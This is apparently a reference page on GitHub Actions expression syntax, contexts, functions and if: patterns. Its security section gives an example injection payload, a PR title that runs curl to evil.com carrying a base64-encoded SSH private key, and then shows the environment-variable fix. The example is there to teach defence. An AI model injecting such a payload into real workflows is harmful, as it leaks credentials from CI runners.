# Contexts & expressions — `${{ }}`

Everything inside `${{ }}` is evaluated **by GitHub, before the step runs**.
The runner never sees the expression, only its result. That single fact
explains both how they work and why they're a security risk.

---

## When you need `${{ }}` and when you don't

```yaml
- run: echo "${{ github.sha }}"        # needed — inside a string
  if: github.ref == 'refs/heads/main'  # NOT needed — if: is already an
                                       # expression context
```

`if:` is implicitly an expression. Writing `if: ${{ ... }}` works but is
redundant, **except** when the value starts with `!` — YAML would read that as
a tag:

```yaml
if: ${{ !cancelled() }}      # braces REQUIRED here
```

---

# The contexts

## `github` — the event and repo

| Expression | Value |
|---|---|
| `github.repository` | `owner/repo` |
| `github.repository_owner` | `owner` |
| `github.sha` | full commit SHA that triggered the run |
| `github.ref` | `refs/heads/main`, `refs/tags/v1.0`, `refs/pull/42/merge` |
| `github.ref_name` | `main`, `v1.0`, `42/merge` — the short form |
| `github.ref_type` | `branch` or `tag` |
| `github.head_ref` | source branch of a PR (empty otherwise) |
| `github.base_ref` | target branch of a PR |
| `github.event_name` | `push`, `pull_request`, `schedule`, … |
| `github.event` | **the whole webhook payload** |
| `github.actor` | who triggered it |
| `github.run_id` / `github.run_number` / `github.run_attempt` | run identity |
| `github.workspace` | checkout path |
| `github.token` | the automatic `GITHUB_TOKEN` |
| `github.workflow` | workflow name |

`github.event` is the raw payload, so anything the webhook contains is
reachable:

```yaml
${{ github.event.pull_request.number }}
${{ github.event.pull_request.title }}
${{ github.event.head_commit.message }}
${{ github.event.inputs.environment }}     # from workflow_dispatch
```

Explore it while debugging:

```yaml
- run: echo '${{ toJSON(github.event) }}'
```

## `env`, `vars`, `secrets`

```text
${{ env.MY_VAR }}         # env vars defined in the workflow
${{ vars.API_URL }}       # repo/org/environment VARIABLES (not secret)
${{ secrets.API_KEY }}    # repo/org/environment SECRETS (masked)
${{ secrets.GITHUB_TOKEN }}  # automatic, always present
```

**`vars` vs `secrets`:** both are set in Settings → Secrets and variables.
`vars` are visible in logs and the UI — use them for non-sensitive config like
region or URL. `secrets` are masked and write-only.

## `job`, `steps`, `runner`

```text
${{ job.status }}                      # success | failure | cancelled
${{ job.services.postgres.id }}
${{ steps.<id>.outputs.<name> }}       # a step's output
${{ steps.<id>.outcome }}              # before continue-on-error is applied
${{ steps.<id>.conclusion }}           # after continue-on-error is applied
${{ runner.os }}                       # Linux | Windows | macOS
${{ runner.arch }}                     # X86 | X64 | ARM | ARM64
${{ runner.temp }}                     # scratch dir
```

> `outcome` vs `conclusion` matters with `continue-on-error: true`: a failing
> step has `outcome == 'failure'` but `conclusion == 'success'`. Test
> `outcome` when you want to know whether it really failed.

## `needs`, `matrix`, `inputs`

```text
${{ needs.build.outputs.version }}     # another job's output
${{ needs.build.result }}              # success | failure | cancelled | skipped
${{ matrix.node }}                     # current matrix value
${{ inputs.environment }}              # workflow_dispatch / workflow_call input
```

---

# Operators

```text
==  !=  <  <=  >  >=          # comparison
&&  ||  !                      # logical
( )                            # grouping
github.event.x                 # property access
matrix['node']                 # index access
```

**Type coercion is loose and occasionally surprising.** `'' == 0` is true;
`'abc' == 0` is false. Compare strings to strings.

**The `&&`/`||` ternary trick** — there's no `? :` operator:

```yaml
${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
```

Reads as "if main then production else staging". Careful: if the middle value
is falsy (`''`, `0`, `false`) you always get the last one.

---

# Functions

## String

```text
contains('hello world', 'world')            # true
contains(github.event.head_commit.message, '[skip ci]')
contains(fromJSON('["a","b"]'), 'a')        # works on arrays too
startsWith(github.ref, 'refs/tags/')
endsWith(github.ref, '/main')
format('Hello {0}, you are {1}', 'Bob', 42)
join(matrix.*.node, ', ')
```

## JSON

```text
toJSON(github.event)                        # object -> pretty JSON string
fromJSON('{"a":1}').a                       # string -> object
fromJSON(needs.setup.outputs.matrix)        # dynamic matrix!
```

`fromJSON` enables **dynamic matrices** — build the list in one job, use it as
a matrix in the next:

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      targets: ${{ steps.gen.outputs.targets }}
    steps:
      - id: gen
        run: echo 'targets=["a","b","c"]' >> "$GITHUB_OUTPUT"
  build:
    needs: setup
    strategy:
      matrix:
        target: ${{ fromJSON(needs.setup.outputs.targets) }}
    runs-on: ubuntu-latest
    steps:
      - run: echo "building ${{ matrix.target }}"
```

## Files

```text
hashFiles('**/package-lock.json')           # SHA of matching files
hashFiles('**/go.sum', '**/go.mod')
```

This is how cache keys work — the key changes only when dependencies change:

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    restore-keys: ${{ runner.os }}-node-
```

## Status checks

Only valid in `if:`:

```text
success()      # all previous steps succeeded (the DEFAULT if you omit if:)
failure()      # a previous step failed
cancelled()    # the run was cancelled
always()       # run no matter what — INCLUDING cancellation
```

```yaml
- name: Upload logs even on failure
  if: always()
  uses: actions/upload-artifact@v4
  with: { name: logs, path: logs/ }

- name: Notify only on failure
  if: failure()
  run: ./notify.sh

- name: Cleanup unless cancelled
  if: ${{ !cancelled() }}
  run: ./cleanup.sh
```

> Prefer `!cancelled()` over `always()`. With `always()`, a job keeps running
> even after you press Cancel — which is rarely what you want and burns
> minutes.

---

# Common `if:` patterns

```yaml
# only on the main branch
if: github.ref == 'refs/heads/main'

# only on a tag
if: startsWith(github.ref, 'refs/tags/v')

# only on push, not PR
if: github.event_name == 'push'

# only on PRs that are not drafts
if: github.event_name == 'pull_request' && !github.event.pull_request.draft

# skip when the commit says so
if: "!contains(github.event.head_commit.message, '[skip ci]')"

# not on forks (secrets won't exist there anyway)
if: github.event.pull_request.head.repo.full_name == github.repository

# only if a previous job produced something
if: needs.build.outputs.changed == 'true'

# manual runs with a specific input
if: github.event_name == 'workflow_dispatch' && inputs.environment == 'production'
```

> Everything from a context is a **string**. `if: needs.build.outputs.changed`
> is truthy for the string `'false'`. Always compare explicitly:
> `== 'true'`.

---

# The security trap: expression injection

This is the single most important thing on this page.

```yaml
# DANGEROUS — never do this
- run: |
    echo "Title: ${{ github.event.pull_request.title }}"
```

The expression is substituted **into the shell script before it runs**. A PR
titled:

```
"; curl evil.com/$(cat ~/.ssh/id_rsa | base64); echo "
```

becomes a shell command on your runner. Same risk for `issue.title`,
`comment.body`, `head_commit.message`, branch names — **any attacker-controlled
text**.

**The fix: pass it through an environment variable.**

```yaml
# SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Title: $TITLE"
```

The value goes into the environment as *data*, and the shell never parses it
as code. See [SECURITY.md](SECURITY.md).

---

# Debugging expressions

```yaml
- name: Dump everything
  run: |
    echo "=== github ==="   ; echo '${{ toJSON(github) }}'
    echo "=== needs ==="    ; echo '${{ toJSON(needs) }}'
    echo "=== matrix ==="   ; echo '${{ toJSON(matrix) }}'
    echo "=== steps ==="    ; echo '${{ toJSON(steps) }}'
```

Enable verbose runner logs by setting these **repository secrets**:

| Secret | Effect |
|---|---|
| `ACTIONS_STEP_DEBUG` = `true` | debug output from each step |
| `ACTIONS_RUNNER_DEBUG` = `true` | runner diagnostic logs |
